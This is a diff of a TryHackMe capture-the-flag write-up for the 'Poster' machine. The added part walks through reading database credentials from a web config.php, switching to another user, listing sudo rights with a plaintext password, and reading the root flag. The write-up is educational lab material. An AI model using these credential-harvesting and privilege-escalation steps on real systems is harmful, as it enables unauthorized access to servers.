@@ -1,9 +1,6 @@
 # poster writeup
-### platform : tryhackme
-### diffeculty : easy
-### author: Ali Amouz
-## machine overview
-this is an easy machine from tryhackme where we need to use metasploit auxialiries along with an exploit to get initial access .. 
+## machine information 
+this is an easy machine from tryhackme where we need to exploit a vulnerability in postgresql 
 
 ## enumeration 
 ### nmap 
@@ -145,4 +142,44 @@ dark:qwerty1234#!hackme
 ```
 we got some intresting credintils form dark . so we can login via ssh 
 ( after login via ssh I have found out that the user dark does not have any intersting permissions on the server so we need to find a way to login as alison)
+there is a file in /var/www/html named config.php that contains 
+```
+dark@ubuntu:/home/alison$ cd /var/www/html
+cd /var/www/html
+dark@ubuntu:/var/www/html$ ls
+ls
+config.php  poster
+dark@ubuntu:/var/www/html$ cat config.php
+cat config.php
+<?php 
 
+        $dbhost = "127.0.0.1";
+        $dbuname = "alison";
+        $dbpass = "****";
+        $dbname = "mysudopassword";
+```
+so like this we now can su or ssh to alison and get the user flag :
+```
+cd /home/alison
+alison@ubuntu:~$ cat user.txt
+cat user.txt
+THM{********}
+alison@ubuntu:~$ 
+```
+## previlige escalation
+
+from below . the user can run any command as root . like this we easly get the root flag
+alison@ubuntu:~$ sudo -l
+sudo -l
+[sudo] password for alison: p4ssw0rdS3cur3!#
+
+Matching Defaults entries for alison on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alison may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+alison@ubuntu:~$ sudo cat /root/root.txt
+sudo cat /root/root.txt
+THM{******}
+alison@ubuntu:~$ 
